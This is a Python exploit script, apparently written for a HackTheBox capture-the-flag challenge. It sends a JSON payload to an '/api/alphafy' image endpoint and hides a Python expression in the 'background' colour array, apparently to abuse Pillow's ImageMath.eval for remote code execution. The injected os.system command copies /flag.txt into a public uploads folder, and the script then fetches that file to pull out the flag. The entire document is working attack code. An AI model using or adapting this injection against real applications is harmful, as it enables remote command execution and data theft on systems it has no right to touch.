import sys
import requests
import re

if len(sys.argv) != 2:
    print("Usage: python3 exploit.py <host:port>")
    sys.exit(1)

host = sys.argv[1]
url = f"http://{host}/api/alphafy"
flag_url = f"http://{host}/static/uploads/flag.txt"

# Minimal valid 1x1 transparent PNG encoded in base64
image_base64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg=="

# Payload exploiting ImageMath.eval by injecting Python code via RGB array
data = {
    "background": [
        "__import__('os').system('cp /flag.txt /app/application/static/uploads/flag.txt')",
        0,
        0
    ],
    "image": image_base64
}

try:
    # Send the malicious POST request to trigger the RCE
    requests.post(url, json=data, timeout=5)
    r = requests.get(flag_url, timeout=5)
    # Extract the flag using regex
    flag = re.search(r"HTB\{.*?\}", r.text)

    if flag:
        print("Flag: ",flag.group(0))
    else:
        print("Flag not found.")
except Exception as e:
    print(f"[!] Exploit failed: {e}")
    sys.exit(1)
